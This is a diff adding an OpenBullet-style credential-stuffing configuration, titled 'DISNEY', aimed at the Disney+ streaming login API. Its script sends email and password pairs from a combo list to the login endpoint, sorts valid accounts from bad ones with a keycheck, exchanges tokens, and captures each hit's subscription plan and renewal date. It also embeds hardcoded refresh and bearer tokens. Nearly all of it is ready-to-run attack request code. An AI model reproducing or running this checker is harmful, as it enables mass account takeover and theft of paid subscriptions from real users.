@@ -1,0 +1,132 @@
+[SETTINGS]
+{
+  "Name": "DISNEY",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-04T19:34:06.4896652-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://global.edge.bamgrid.com/token" 
+  CONTENT "platform=iphone&grant_type=refresh_token&refresh_token=eyJraWQiOiJlNzRlOTlhNy04NDNlLTQ2NmEtOTVhMS02YjA0MjYwNThlNmYiLCJhbGciOiJFZERTQSJ9.eyJhdWQiOiJ1cm46YmFtdGVjaDpzZXJ2aWNlOnRva2VuIiwic3ViamVjdF90b2tlbl90eXBlIjoidXJuOmJhbXRlY2g6cGFyYW1zOm9hdXRoOnRva2VuLXR5cGU6ZGV2aWNlIiwibmJmIjoxNTg4NjMzNzIyLCJncmFudF90eXBlIjoidXJuOmlldGY6cGFyYW1zOm9hdXRoOmdyYW50LXR5cGU6dG9rZW4tZXhjaGFuZ2UiLCJpc3MiOiJ1cm46YmFtdGVjaDpzZXJ2aWNlOnRva2VuIiwiY29udGV4dCI6ImV5SmhiR2NpT2lKdWIyNWxJbjAuZXlKemRXSWlPaUl6WldRelpEZzRZaTA1TVdZNUxUUmlOemt0T0dJeE9TMWxZalV5TVRFM056ZG1ZVGtpTENKaGRXUWlPaUoxY200NlltRnRkR1ZqYURwelpYSjJhV05sT25SdmEyVnVJaXdpYm1KbUlqb3hOVGMxTURnek5qazJMQ0pwYzNNaU9pSjFjbTQ2WW1GdGRHVmphRHB6WlhKMmFXTmxPbVJsZG1salpTSXNJbVY0Y0NJNk1qUXpPVEE0TXpZNU5pd2lhV0YwSWpveE5UYzFNRGd6TmprMkxDSnFkR2tpT2lJd1pXWXlZMlF6WVMwNU5qa3lMVFEzTkRRdFlXWTFOQzFoWXpOaE5UUTNNalkzWlRjaWZRLiIsImV4cCI6MTYwNDE4NTcyMiwiaWF0IjoxNTg4NjMzNzIyLCJqdGkiOiI0NDUxMjRiMC03ZWY3LTRiODgtYWM2YS0zMDc4ZGU2OGEzY2MifQ.Girkcig3mLCMsQDLHuhifNFvVEFF9mzcBWpvb8xMT5KB6-8_SGXLilGd7cf-JQZA3b812vVHzA4iuDxJlcHRDQ" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone9,1" 
+  HEADER "Accept: application/json" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" 
+  HEADER "X-BAMSDK-Transaction-ID: 72774E75-0E7A-4317-A14B-AF2F73F0BEAB" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-BAMSDK-Version: 9.6.1" 
+  HEADER "Content-Length: 1037" 
+  HEADER "User-Agent: Disney+/20757 CFNetwork/1125.2 Darwin/19.5.0" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "TOKEN1" 
+
+REQUEST POST "https://global.edge.bamgrid.com/idp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone9,1" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer <TOKEN1>" 
+  HEADER "X-BAMSDK-Transaction-ID: F1F2B20F-7BA0-48D1-97CA-577F82E19D89" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "X-BAMSDK-Version: 9.6.1" 
+  HEADER "Content-Length: 49" 
+  HEADER "User-Agent: Disney+/20757 CFNetwork/1125.2 Darwin/19.5.0" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Bad credentials sent for" 
+  KEYCHAIN Success OR 
+    KEY "id_token" 
+
+PARSE "<SOURCE>" LR "id_token\":\"" "\"" -> VAR "TOKEN" 
+
+REQUEST POST "https://global.edge.bamgrid.com/accounts/grant" 
+  CONTENT "{\"id_token\":\"<TOKEN>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN1>" 
+
+PARSE "<SOURCE>" LR "assertion\":\"" "\"" -> VAR "1" 
+
+REQUEST POST "https://global.edge.bamgrid.com/token" 
+  CONTENT "subject_token=<1>&grant_type=urn:ietf:params:oauth:grant-type:token-exchange&platform=iphone&subject_token_type=urn:bamtech:params:oauth:token-type:account" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone9,1" 
+  HEADER "Accept: application/json" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4" 
+  HEADER "X-BAMSDK-Transaction-ID: 50D26218-5F3B-4858-B9F6-CA147AB0567B" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-BAMSDK-Version: 9.6.1" 
+  HEADER "Content-Length: 688" 
+  HEADER "User-Agent: Disney+/20757 CFNetwork/1125.2 Darwin/19.5.0" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "NICE" 
+
+REQUEST GET "https://global.edge.bamgrid.com/subscriptions" 
+  
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "X-BAMSDK-Platform: iPhone9,1" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "X-BAMSDK-Client-ID: disney-svod-3d9324fc" 
+  HEADER "Authorization: Bearer <NICE>" 
+  HEADER "X-BAMSDK-Transaction-ID: A5C94F23-F564-4281-8968-D01B3D813A30" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "X-BAMSDK-Version: 9.6.1" 
+  HEADER "User-Agent: Disney+/20757 CFNetwork/1125.2 Darwin/19.5.0" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" LR "name\":\"" "\"" CreateEmpty=FALSE -> CAP "PLAN" 
+
+PARSE "<SOURCE>" LR "nextRenewalDate\":\"" "T" CreateEmpty=FALSE -> CAP "RENEWAL" 
+
